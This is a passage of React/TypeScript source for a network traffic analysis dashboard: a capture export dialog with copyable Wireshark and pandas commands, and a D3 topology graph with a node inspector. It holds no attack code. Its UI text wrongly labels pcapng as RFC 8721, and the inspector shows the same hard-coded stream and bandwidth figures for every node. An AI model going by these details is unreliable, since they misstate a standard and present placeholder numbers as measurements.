                            <span className="text-[9px] bg-blue-500/20 text-blue-300 px-1.5 py-0.5 rounded-full font-bold">
                              {isZh ? '推薦' : 'Next-Gen'}
                            </span>
                          </div>
                          <p className="text-[10px] text-gray-400 mt-1 font-sans">
                            {isZh ? 'PCAP Next Gen (RFC 8721)' : 'PCAP Next Generation (RFC 8721)'}
                          </p>
                        </div>
                        <input 
                          type="radio" 
                          checked={exportFormat === 'pcapng'} 
                          onChange={() => setExportFormat('pcapng')}
                          className="mt-1 accent-blue-600"
                        />
                      </div>
                      <div className="pt-2 border-t border-gray-800/80 text-[10px] text-gray-500 font-mono space-y-0.5">
                        <div>• Enhanced Packet Blocks (EPB)</div>
                        <div>• 64-bit microsecond timestamps</div>
                        <div>• Wireshark &amp; TShark native</div>
                      </div>
                    </div>

                    {/* PCAP */}
                    <div 
                      onClick={() => setExportFormat('pcap')}
                      className={cn(
                        "p-3.5 rounded-2xl border cursor-pointer transition-all relative flex flex-col justify-between gap-2",
                        exportFormat === 'pcap'
                          ? "bg-blue-600/10 border-blue-500 shadow-md shadow-blue-500/10"
                          : "bg-[#09090b] border-gray-800 hover:border-gray-700 text-gray-400"
                      )}
                    >
                      <div className="flex items-start justify-between">
                        <div>
                          <div className="flex items-center gap-1.5">
                            <span className="text-sm font-black text-white font-mono">.pcap</span>
                            <span className="text-[9px] bg-gray-800 text-gray-300 px-1.5 py-0.5 rounded-full font-bold">
                              {isZh ? '通用' : 'Classic'}
                            </span>
                          </div>
                          <p className="text-[10px] text-gray-400 mt-1 font-sans">
                            {isZh ? 'Libpcap 2.4 標準二進位格式' : 'Classic Libpcap 2.4 binary'}
                          </p>
                        </div>
                        <input 
                          type="radio" 
                          checked={exportFormat === 'pcap'} 
                          onChange={() => setExportFormat('pcap')}
                          className="mt-1 accent-blue-600"
                        />
                      </div>
                      <div className="pt-2 border-t border-gray-800/80 text-[10px] text-gray-500 font-mono space-y-0.5">
                        <div>• Magic: 0xa1b2c3d4 (Ethernet II)</div>
                        <div>• Compatible with tcpdump, Snort</div>
                        <div>• Arkime, Zeek, legacy SIEM</div>
                      </div>
                    </div>

                    {/* CSV */}
                    <div 
                      onClick={() => setExportFormat('csv')}
                      className={cn(
                        "p-3.5 rounded-2xl border cursor-pointer transition-all relative flex flex-col justify-between gap-2",
                        exportFormat === 'csv'
                          ? "bg-emerald-600/10 border-emerald-500 shadow-md shadow-emerald-500/10"
                          : "bg-[#09090b] border-gray-800 hover:border-gray-700 text-gray-400"
                      )}
                    >
                      <div className="flex items-start justify-between">
                        <div>
                          <div className="flex items-center gap-1.5">
                            <span className="text-sm font-black text-white font-mono">.csv</span>
                            <span className="text-[9px] bg-emerald-500/20 text-emerald-300 px-1.5 py-0.5 rounded-full font-bold">
                              {isZh ? '鑑識清單' : 'Forensics'}
                            </span>
                          </div>
                          <p className="text-[10px] text-gray-400 mt-1 font-sans">
                            {isZh ? 'RFC 4180 標準含 UTF-8 BOM' : 'RFC 4180 with UTF-8 BOM'}
                          </p>
                        </div>
                        <input 
                          type="radio" 
                          checked={exportFormat === 'csv'} 
                          onChange={() => setExportFormat('csv')}
                          className="mt-1 accent-emerald-500"
                        />
                      </div>
                      <div className="pt-2 border-t border-gray-800/80 text-[10px] text-gray-500 font-mono space-y-0.5">
                        <div>• 5-Tuple, JA3, TCP Flags, GeoIP</div>
                        <div>• Bytes In/Out, Packets, Threat</div>
                        <div>• Excel, Pandas, Splunk, ELK</div>
                      </div>
                    </div>
                  </div>
                </div>

                {/* 3. Live Telemetry & Summary */}
                <div className="bg-[#09090b] border border-gray-800 rounded-2xl p-4 space-y-3 font-mono text-xs">
                  <div className="flex items-center justify-between text-gray-400 pb-2 border-b border-gray-800/80">
                    <span className="font-bold flex items-center gap-1.5">
                      <Layers size={13} className="text-emerald-400" />
                      {isZh ? '匯出統計摘要' : 'Export Summary & Statistics'}
                    </span>
                    <span className="text-[10px] text-emerald-400 bg-emerald-500/10 border border-emerald-500/30 px-2 py-0.5 rounded-full">
                      Ready to build
                    </span>
                  </div>

                  <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 text-[11px]">
                    <div>
                      <span className="text-gray-500 block">{isZh ? '連線串流' : 'Flow Streams'}:</span>
                      <strong className="text-white text-sm">{targetExportSessions.length}</strong>
                    </div>
                    <div>
                      <span className="text-gray-500 block">
                        {exportFormat === 'csv' ? (isZh ? '鑑識紀錄筆數' : 'Data Rows') : (isZh ? '重構封包' : 'Packets')}:
                      </span>
                      <strong className="text-blue-400 text-sm">
                        {exportFormat === 'csv' ? `${targetExportSessions.length} 筆` : `~${estimatedPackets}`}
                      </strong>
                    </div>
                    <div>
                      <span className="text-gray-500 block">
                        {exportFormat === 'csv' ? (isZh ? '資料欄位數' : 'Fields') : (isZh ? '訊框協定' : 'Protocols')}:
                      </span>
                      <strong className="text-purple-400 text-sm truncate block">
                        {exportFormat === 'csv' 
                          ? '23 鑑識欄位'
                          : (Array.from(new Set(targetExportSessions.map(s => s.proto))).join(', ') || 'N/A')}
                      </strong>
                    </div>
                    <div>
                      <span className="text-gray-500 block">{isZh ? '編碼規格' : 'Standard'}:</span>
                      <strong className="text-gray-300 text-sm">
                        {exportFormat === 'csv' ? 'RFC 4180 (UTF-8 BOM)' : (exportFormat === 'pcapng' ? 'RFC 8721' : 'Libpcap 2.4')}
                      </strong>
                    </div>
                  </div>

                  {/* Endpoints */}
                  <div className="pt-2 border-t border-gray-800/60 text-[10px] text-gray-400 flex flex-wrap gap-1.5 items-center">
                    <span className="text-gray-500">{isZh ? '包含端點:' : 'Endpoints:'}</span>
                    {targetExportSessions.slice(0, 4).map((s, idx) => (
                      <span key={idx} className="bg-black/60 border border-gray-800 px-1.5 py-0.5 rounded text-gray-300">
                        {s.src_ip} ➔ {s.dst_ip}:{s.dst_port}
                      </span>
                    ))}
                    {targetExportSessions.length > 4 && (
                      <span className="text-gray-600">+{targetExportSessions.length - 4} more</span>
                    )}
                  </div>
                </div>

                {/* 4. Forensic Inspection Helper / Quick CLI */}
                <div className="bg-black/40 border border-gray-800/80 rounded-2xl p-3.5 space-y-2">
                  <div className="flex items-center justify-between text-[11px]">
                    <span className="text-gray-400 font-bold flex items-center gap-1.5">
                      <Terminal size={12} className="text-amber-400" />
                      {exportFormat === 'csv'
                        ? (isZh ? 'Python / Pandas / Shell 鑑識分析指令' : 'Python / Pandas / Shell Forensic Quick Command')
                        : (isZh ? 'Wireshark / TShark 快速分析指令' : 'Wireshark / TShark Quick Inspection')}
                    </span>
                    <button
                      onClick={() => {
                        const fname = customExportFilename.trim() || `semor_flow_${targetExportSessions.length}records.${exportFormat}`;
                        const cmdText = exportFormat === 'csv'
                          ? `python3 -c "import pandas as pd; df = pd.read_csv('${fname}'); print(df[['Timestamp', 'Source_IP', 'Destination_IP', 'Threat_Level']].head())"\n# or filter high threats:\ncat ${fname} | grep -E "Critical|High"`
                          : `wireshark -r ${fname}\n# or with tshark:\ntshark -r ${fname} -q -z conv,ip`;
                        navigator.clipboard.writeText(cmdText);
                        setCopiedWiresharkCmd(true);
                        setTimeout(() => setCopiedWiresharkCmd(false), 2000);
                      }}
                      className="text-[10px] font-mono text-gray-400 hover:text-white flex items-center gap-1"
                    >
                      {copiedWiresharkCmd ? <Check size={11} className="text-emerald-400" /> : <Copy size={11} />}
                      <span>{copiedWiresharkCmd ? (isZh ? '已複製！' : 'Copied!') : (isZh ? '複製指令' : 'Copy')}</span>
                    </button>
                  </div>
                  <div className="font-mono text-[10px] bg-black/80 rounded-xl p-2.5 text-gray-300 border border-gray-800/60 overflow-x-auto">
                    {exportFormat === 'csv' ? (
                      <code>python3 -c "import pandas as pd; df = pd.read_csv('{customExportFilename.trim() || `semor_flow_${targetExportSessions.length}records.csv`}'); print(df.groupby('Threat_Level').size())"</code>
                    ) : (
                      <code>wireshark -r {customExportFilename.trim() || `semor_flow_${targetExportSessions.length}sessions.${exportFormat}`}</code>
                    )}
                  </div>
                </div>

                {/* 5. Custom Filename */}
                <div className="space-y-1.5">
                  <label className="text-xs font-bold uppercase tracking-wider text-gray-400">
                    {isZh ? '自訂檔案名稱 (選填)' : 'Custom File Name (Optional)'}
                  </label>
                  <div className="relative flex items-center">
                    <input 
                      type="text"
                      placeholder={`semor_flow_${targetExportSessions.length}${exportFormat === 'csv' ? 'records' : 'sessions'}_${new Date().toISOString().slice(0, 10).replace(/-/g, '')}.${exportFormat}`}
                      value={customExportFilename}
                      onChange={(e) => setCustomExportFilename(e.target.value)}
                      className="w-full bg-[#09090b] border border-gray-800 rounded-xl py-2.5 px-3 text-xs font-mono text-gray-200 placeholder:text-gray-600 focus:outline-none focus:border-blue-500"
                    />
                    <span className="absolute right-3 text-xs font-mono text-gray-500">
                      .{exportFormat}
                    </span>
                  </div>
                </div>
              </div>

              {/* Footer */}
              <div className="p-5 border-t border-gray-800 bg-[#09090b] flex items-center justify-between gap-3">
                <button 
                  type="button"
                  onClick={() => setIsExportModalOpen(false)}
                  className="px-4 py-2.5 bg-gray-800 hover:bg-gray-700 text-gray-300 hover:text-white rounded-xl text-xs font-bold transition-colors"
                >
                  {isZh ? '取消' : 'Cancel'}
                </button>
                <div className="flex items-center gap-2">
                  <button 
                    type="button"
                    onClick={() => handleExportTraffic(targetExportSessions, exportFormat)}
                    disabled={targetExportSessions.length === 0}
                    className="px-5 py-2.5 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-500 hover:to-indigo-500 disabled:opacity-50 text-white rounded-xl text-xs font-bold transition-all flex items-center gap-2 shadow-lg shadow-blue-600/25 cursor-pointer"
                  >
                    <FileDown size={14} />
                    <span>
                      {exportFormat === 'csv' 
                        ? (isZh 
                            ? `生成並匯出 CSV 鑑識清單 (${targetExportSessions.length} 筆)` 
                            : `Download CSV Forensic Log (${targetExportSessions.length} records)`)
                        : (isZh 
                            ? `生成並匯出 ${exportFormat.toUpperCase()} (${estimatedPackets} 封包)` 
                            : `Download ${exportFormat.toUpperCase()} Capture (${estimatedPackets} pkts)`)}
                    </span>
                  </button>
                </div>
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>
    </div>
  );
}

// 🌐 D3.js Force Directed Interactive Topology Component
function TrafficD3Topology({ 
  sessions, 
  isZh, 
  showToast,
  onCaptureNode 
}: { 
  sessions: TrafficSession[]; 
  isZh: boolean; 
  showToast: (msg: string) => void;
  onCaptureNode?: (nodeId: string) => void;
}) {
  const svgRef = useRef<SVGSVGElement>(null);
  const containerRef = useRef<HTMLDivElement>(null);
  const [selectedNode, setSelectedNode] = useState<any | null>(null);

  useEffect(() => {
    if (!svgRef.current || !containerRef.current) return;

    const width = containerRef.current.clientWidth || 800;
    const height = 520;
    const svg = d3.select(svgRef.current);
    svg.selectAll("*").remove();

    // Build unique nodes and links
    const nodesMap = new Map();
    const links: any[] = [];

    sessions.forEach(s => {
      if (!nodesMap.has(s.src_ip)) {
        nodesMap.set(s.src_ip, { 
          id: s.src_ip, 
          type: s.geo_src?.country.includes('LAN') || s.geo_src?.country.includes('Server') ? 'internal' : 'external',
          flag: s.geo_src?.flag || '🏢',
          threat: s.threat_level
        });
      }
      if (!nodesMap.has(s.dst_ip)) {
        nodesMap.set(s.dst_ip, { 
          id: s.dst_ip, 
          type: s.geo_dst?.country.includes('LAN') || s.geo_dst?.country.includes('Server') || s.geo_dst?.country.includes('Master') ? 'internal' : 'external',
          flag: s.geo_dst?.flag || '🌐',
          threat: s.threat_level
        });
      }
      links.push({ source: s.src_ip, target: s.dst_ip, proto: s.proto, threat: s.threat_level });
    });

    const nodes = Array.from(nodesMap.values());

    const simulation = d3.forceSimulation(nodes as any)
      .force("link", d3.forceLink(links).id((d: any) => d.id).distance(180))
      .force("charge", d3.forceManyBody().strength(-400))
      .force("center", d3.forceCenter(width / 2, height / 2));

    const g = svg.append("g");

    // Arrowhead marker
    svg.append("defs").append("marker")
      .attr("id", "ndr-arrowhead")
      .attr("viewBox", "-0 -5 10 10")
      .attr("refX", 22)
      .attr("refY", 0)
      .attr("orient", "auto")
      .attr("markerWidth", 6)
      .attr("markerHeight", 6)
      .append("svg:path")
      .attr("d", "M 0,-5 L 10 ,0 L 0,5")
      .attr("fill", "#3b82f6")
      .style("stroke", "none");

    const link = g.append("g")
      .selectAll("line")
      .data(links)
      .enter().append("line")
      .attr("stroke", (d: any) => d.threat === 'Critical' ? "#f43f5e" : d.threat === 'High' ? "#f97316" : "#3b82f6")
      .attr("stroke-opacity", 0.7)
      .attr("stroke-width", 2)
      .attr("stroke-dasharray", (d: any) => d.threat === 'Critical' ? "5,5" : "none")
      .attr("marker-end", "url(#ndr-arrowhead)");

    const node = g.append("g")
      .selectAll("g")
      .data(nodes)
      .enter().append("g")
      .call(d3.drag<any, any>()
        .on("start", (event) => {
          if (!event.active) simulation.alphaTarget(0.3).restart();
          event.subject.fx = event.subject.x;
          event.subject.fy = event.subject.y;
        })
        .on("drag", (event) => {
          event.subject.fx = event.x;
          event.subject.fy = event.y;
        })
        .on("end", (event) => {
          if (!event.active) simulation.alphaTarget(0);
          event.subject.fx = null;
          event.subject.fy = null;
        }))
      .on("click", (_, d) => {
        setSelectedNode(d);
      });

    // Outer glow for nodes
    node.append("circle")
      .attr("r", 14)
      .attr("fill", (d: any) => d.threat === 'Critical' ? "#881337" : d.type === 'internal' ? "#1e3a8a" : "#065f46")
      .attr("stroke", (d: any) => d.threat === 'Critical' ? "#f43f5e" : d.type === 'internal' ? "#3b82f6" : "#10b981")
      .attr("stroke-width", 2);

    node.append("text")
      .attr("dy", 4)
      .attr("text-anchor", "middle")
      .attr("font-size", "10px")
      .text((d: any) => d.flag);

    node.append("text")
      .attr("dy", 26)
      .attr("text-anchor", "middle")
      .attr("fill", "#e2e8f0")
      .attr("font-size", "11px")
      .attr("font-family", "monospace")
      .attr("font-weight", "bold")
      .text((d: any) => d.id);

    simulation.on("tick", () => {
      link
        .attr("x1", (d: any) => d.source.x)
        .attr("y1", (d: any) => d.source.y)
        .attr("x2", (d: any) => d.target.x)
        .attr("y2", (d: any) => d.target.y);

      node.attr("transform", (d: any) => `translate(${d.x},${d.y})`);
    });

    // Zoom
    svg.call(d3.zoom<SVGSVGElement, unknown>()
      .extent([[0, 0], [width, height]])
      .scaleExtent([0.5, 5])
      .on("zoom", (event) => {
        g.attr("transform", event.transform);
      }));

  }, [sessions]);

  return (
    <div className="grid grid-cols-1 lg:grid-cols-12 gap-6 items-start">
      {/* Topology Canvas */}
      <div className="lg:col-span-8 bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl relative overflow-hidden">
        <div className="flex items-center justify-between mb-2">
          <div>
            <h3 className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
              <Network className="w-4 h-4 text-blue-400" />
              {isZh ? '動態連線拓撲圖 (Interactive D3 Force Graph)' : 'Flow Graph'}
            </h3>
            <p className="text-[10px] text-gray-500 font-mono mt-0.5">{isZh ? '支援節點拖曳重構與滾輪縮放' : 'Drag nodes to reposition'}</p>
          </div>

          <div className="flex items-center gap-2 text-xs font-mono">
            <span className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-blue-500" /> {isZh ? '內部網段' : 'Internal'}</span>
            <span className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-emerald-500" /> {isZh ? '外部連線' : 'External'}</span>
            <span className="flex items-center gap-1.5"><span className="w-2.5 h-2.5 rounded-full bg-rose-500" /> {isZh ? '高危威脅' : 'Threat'}</span>
          </div>
        </div>

        <div ref={containerRef} className="w-full h-[520px] bg-[#09090b] rounded-2xl border border-gray-800/80 relative">
          <svg ref={svgRef} className="w-full h-full cursor-grab active:cursor-grabbing" />
        </div>
      </div>

      {/* Node Details Drawer / Sidebar */}
      <div className="lg:col-span-4 bg-[#111114] border border-gray-800/80 rounded-3xl p-5 shadow-2xl space-y-4">
        <div className="border-b border-gray-800 pb-3">
          <span className="text-xs font-black uppercase tracking-wider text-white flex items-center gap-2">
            <Eye className="w-4 h-4 text-purple-400" />
            {isZh ? '選取節點深度探針' : 'Node Inspector'}
          </span>
        </div>

        {selectedNode ? (
          <div className="space-y-4">
            <div className="bg-[#09090b] border border-gray-800 rounded-2xl p-4 space-y-2">
              <div className="flex items-center justify-between">
                <span className="text-2xl">{selectedNode.flag}</span>
                <span className={cn(
                  "text-[10px] font-black uppercase px-2 py-0.5 rounded",
                  selectedNode.type === 'internal' ? "bg-blue-950 text-blue-300" : "bg-emerald-950 text-emerald-300"
                )}>
                  {selectedNode.type}
                </span>
              </div>
              <p className="text-base font-black font-mono text-white">{selectedNode.id}</p>
            </div>

            <div className="space-y-2 text-xs font-mono">
              <div className="flex justify-between py-1.5 border-b border-gray-800">
                <span className="text-gray-500">{isZh ? '當前威脅等級' : 'Threat'}:</span>
                <span className="text-rose-400 font-bold">{selectedNode.threat || 'Clean'}</span>
              </div>
              <div className="flex justify-between py-1.5 border-b border-gray-800">
                <span className="text-gray-500">{isZh ? '關聯會話串流數' : 'Active Flows'}:</span>
                <span className="text-white font-bold">12 Streams</span>
              </div>
              <div className="flex justify-between py-1.5 border-b border-gray-800">
                <span className="text-gray-500">{isZh ? '累計頻寬吞吐' : 'Total Bandwidth'}:</span>
                <span className="text-blue-400 font-bold">165.6 MB</span>
              </div>
            </div>

            <button 
              onClick={() => onCaptureNode ? onCaptureNode(selectedNode.id) : showToast(isZh ? `已針對 ${selectedNode.id} 發起全封包即時 PCAP 側錄任務！` : 'Capture started')}
              className="w-full py-2.5 bg-blue-600 hover:bg-blue-500 text-white rounded-xl text-xs font-black uppercase tracking-wider transition-all"
            >
              {isZh ? '即時側錄此節點 PCAP' : 'Capture Node PCAP'}
            </button>
          </div>
        ) : (
          <div className="text-center py-16 text-gray-500 text-xs">
            <Network className="w-8 h-8 mx-auto mb-2 opacity-30" />
            <p>{isZh ? '請點擊左側拓撲圖中任意節點以檢視連線統計與探針' : 'Click a node on the left topology to view details'}</p>
          </div>
        )}
      </div>
    </div>
  );
}
